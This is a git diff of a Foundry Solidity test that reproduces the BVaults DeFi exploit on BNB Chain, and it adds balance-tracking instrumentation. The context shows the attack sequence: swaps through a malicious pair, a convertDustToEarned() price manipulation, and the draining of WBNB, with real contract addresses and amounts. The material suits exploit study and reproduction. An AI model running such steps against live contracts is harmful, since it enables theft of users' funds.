@@ -5,6 +5,8 @@ import "forge-std/Test.sol";
 import {TestHarness} from "../TestHarness.sol";
 import {IERC20} from "../interfaces/IERC20.sol";
 
+import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';
+
 // forge test --match-contract Exploit_BVaults -vvv
 
 /*
@@ -80,7 +82,7 @@ interface Pair {
     function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
 }
 
-contract Exploit_BVaults is TestHarness {
+contract Exploit_BVaults is TestHarness, TokenBalanceTracker {
 
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IERC20 BDEX = IERC20(0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867);
@@ -100,7 +102,15 @@ contract Exploit_BVaults is TestHarness {
         cheat.label(ATTACKER_CONTRACT, "Attacker Contract");
 
         emit log_string("Initial Attacker Balances");
-        emit log_named_decimal_uint("Malicious Token", maliciousToken.balanceOf(ATTACKER),18);
+        emit log_named_decimal_uint("Malicious Token", maliciousToken.balanceOf(ATTACKER),18); 
+
+        addTokenToTracker(address(WBNB));
+        addTokenToTracker(address(BDEX));
+        addTokenToTracker(address(maliciousToken)); // Apparently, the tracker does not catch this token.
+
+        emit log_string("\nInitial");
+        logBalancesWithLabel('Malicious Contract', ATTACKER_CONTRACT);
+        logBalancesWithLabel('Vault Contract', address(vaultsStrategy));
     }
 
     function test_attack() external {
@@ -110,34 +120,36 @@ contract Exploit_BVaults is TestHarness {
 
         // 2: Swap to get WBNB into a malicious contract
         emit log_string("\nBefore Swap Balances");
-        emit log_named_decimal_uint("Malicious Contract WBNB", WBNB.balanceOf(ATTACKER_CONTRACT),18);
+        logBalancesWithLabel('Malicious Contract', ATTACKER_CONTRACT);
+        logBalancesWithLabel('Vault Contract', address(vaultsStrategy));
 
         MALICIOUS_PAIR.swap(0, 34534837254230472565, ATTACKER_CONTRACT, "");
 
         emit log_string("\nAfter Swap Balances");
-        emit log_named_decimal_uint("Malicious Contract WBNB", WBNB.balanceOf(ATTACKER_CONTRACT),18);
+        logBalancesWithLabel('Malicious Contract', ATTACKER_CONTRACT);
+        logBalancesWithLabel('Vault Contract', address(vaultsStrategy));
         cheat.stopPrank();
 
         // 3: Transfer, Swap, Convert with BDEXBNB Pair and Vault Strategy
         cheat.startPrank(ATTACKER_CONTRACT);
         emit log_string("\nBefore Transfer, Swap, Convert Balances");
-        emit log_named_decimal_uint("Malicious Contract WBNB", WBNB.balanceOf(ATTACKER_CONTRACT),18);
-        emit log_named_decimal_uint("Malicious Contract BDEX", BDEX.balanceOf(ATTACKER_CONTRACT),18);
+        logBalancesWithLabel('Malicious Contract', ATTACKER_CONTRACT);
+        logBalancesWithLabel('Vault Contract', address(vaultsStrategy));
 
         require(WBNB.transfer(address(BDEXWBNB_PAIR), 34534837254230472565), "transfer failed");
         BDEXWBNB_PAIR.swap(14181664488335977539333, 0, ATTACKER_CONTRACT, ""); // WBNB for BDEX
         vaultsStrategy.convertDustToEarned();
 
         emit log_string("\nAfter Transfer, Swap, Convert Balances");
-        emit log_named_decimal_uint("Malicious Contract WBNB", WBNB.balanceOf(ATTACKER_CONTRACT),18);
-        emit log_named_decimal_uint("Malicious Contract BDEX", BDEX.balanceOf(ATTACKER_CONTRACT),18);
+        logBalancesWithLabel('Malicious Contract', ATTACKER_CONTRACT);
+        logBalancesWithLabel('Vault Contract', address(vaultsStrategy));
 
         // 4: Transfer the BDEX back to the BDEX Pair
         require(BDEX.transfer(address(BDEXWBNB_PAIR), BDEX.balanceOf(ATTACKER_CONTRACT)), "transfer failed");
         BDEXWBNB_PAIR.swap(0, 50800786874975680419, ATTACKER_CONTRACT, ""); // BDEX for WBNB
         emit log_string("\n After last swap Balances");
-        emit log_named_decimal_uint("Malicious Contract WBNB", WBNB.balanceOf(ATTACKER_CONTRACT),18);
-        emit log_named_decimal_uint("Malicious Contract BDEX", BDEX.balanceOf(ATTACKER_CONTRACT),18);
+        logBalancesWithLabel('Malicious Contract', ATTACKER_CONTRACT);
+        logBalancesWithLabel('Vault Contract', address(vaultsStrategy));
 
         // 5: Transfer back to the pair 
         require(WBNB.transfer(address(MALICIOUS_PAIR), WBNB.balanceOf(ATTACKER_CONTRACT)), "transfer failed");
